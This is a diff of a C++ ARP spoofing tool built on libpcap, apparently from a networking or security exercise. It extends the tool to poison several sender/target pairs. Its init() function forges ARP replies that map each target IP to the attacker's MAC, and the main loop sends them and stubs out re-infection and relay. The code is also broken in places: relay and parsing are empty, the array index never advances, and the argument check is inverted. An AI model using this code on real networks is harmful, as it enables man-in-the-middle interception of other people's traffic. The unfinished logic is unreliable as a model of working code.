@@ -17,14 +17,17 @@ using namespace std;
 #pragma pack(push, 1)
 struct Spoof final{
     Spoof(){}
-    Spoof(Ip sip, Ip tip,EthArpPacket* pckt){}
+    Spoof(Ip sip, Ip tip,EthArpPacket pckt){
+		sip_=sip; tip_=tip; infctpckt=pckt;
+	}
 public:
 	Ip sip_;
     Ip tip_;
-    EthArpPacket* infctpckt;
+    EthArpPacket infctpckt;
 };
 #pragma pack(pop)
-vector<Spoof> spoofvector;
+Spoof spoofarr[40];
+int idx=0;
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]");
@@ -75,10 +78,8 @@ Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 		}
     }
 }
-int isRelay(EthArpPacket* pckt){
+void Relay(const u_char* packet){
 
-
-	return 1;
 }
 void SendInfectFlood(EthArpPacket* pckt){
 
@@ -89,14 +90,31 @@ void SendInfect(Ip sip){
 int parsing(const u_char* packet){
 
 }
+void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
+	EthArpPacket packet;
+	Mac smac=getsendermac(handle,myip,senderip,mmac);
+	packet.eth_.dmac_ = smac;//mac of sender
+	packet.eth_.smac_ = mmac;//mac of mine(attacker)
+	packet.eth_.type_ = htons(EthHdr::Arp);
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Reply);
+	packet.arp_.smac_ = mmac;//mac of mine(attacker)
+	packet.arp_.sip_ = htonl(targetip);//ip of target
+	packet.arp_.tmac_ = smac;//mac of sender
+	packet.arp_.tip_ = htonl(senderip);//ip of sender
+	Spoof result=Spoof(senderip, targetip, packet);
+	memcpy(&spoofarr[idx],&result,sizeof(Spoof));
+}
 int main(int argc, char* argv[]) {
-	if (argc != 4) {
+	if (argc %2==1) {
 		usage();
 		return -1;
 	}
+	int len=(argc-2)/2;
 	char* dev = argv[1];
-	Ip senderip=Ip(argv[2]);
-	Ip targetip=Ip(argv[3]);
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //read_timeout 10
 	if (handle == nullptr) {
@@ -105,7 +123,8 @@ int main(int argc, char* argv[]) {
 	}
 	const u_char* rawpacket;
 	EthArpPacket packet;
-	EthArpPacket* receivedpckt;
+	EthTcpPacket* tcppacket;
+	EthArpPacket* arppacket;
 	///using ioctl & ifreq to get device information
 	int sock;
 	struct ifreq ifr;
@@ -132,26 +151,13 @@ int main(int argc, char* argv[]) {
 	///
 	Ip myip=getmyip(ifr_ip);
 	Mac mmac=getmymac(ifr);
-	Mac smac=getsendermac(handle,myip,senderip,mmac);
-
-	packet.eth_.dmac_ = smac;//mac of sender
-	packet.eth_.smac_ = mmac;//mac of mine(attacker)
-	packet.eth_.type_ = htons(EthHdr::Arp);
-
-	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-	packet.arp_.pro_ = htons(EthHdr::Ip4);
-	packet.arp_.hln_ = Mac::SIZE;
-	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = mmac;//mac of mine(attacker)
-	packet.arp_.sip_ = htonl(targetip);//ip of target
-	packet.arp_.tmac_ = smac;//mac of sender
-	packet.arp_.tip_ = htonl(senderip);//ip of sender
-	///arp packet creation func out
-
-	for(int i=0; i<spoofvector.size(); i++){
+	
+	for(int i=0; i<len; i++){
+		init(handle, Ip(argv[2+i*2]),Ip(argv[3+i*2]),myip, mmac);
+	}
+	for(int i=0; i<idx; i++){
 		printf("sending arp!!...\n");
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(spoofvector[i].infctpckt), sizeof(EthArpPacket));
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
@@ -170,9 +176,12 @@ int main(int argc, char* argv[]) {
 		{
 		case INFECT:
 			printf("infect!\n");
+			arppacket=(EthArpPacket*)rawpacket;
+			SendInfect(arppacket->arp_.sip_);
 			break;
 		case RELAY:
 			printf("relay!\n");
+			Relay(rawpacket);
 			break;
 		default:
 			break;
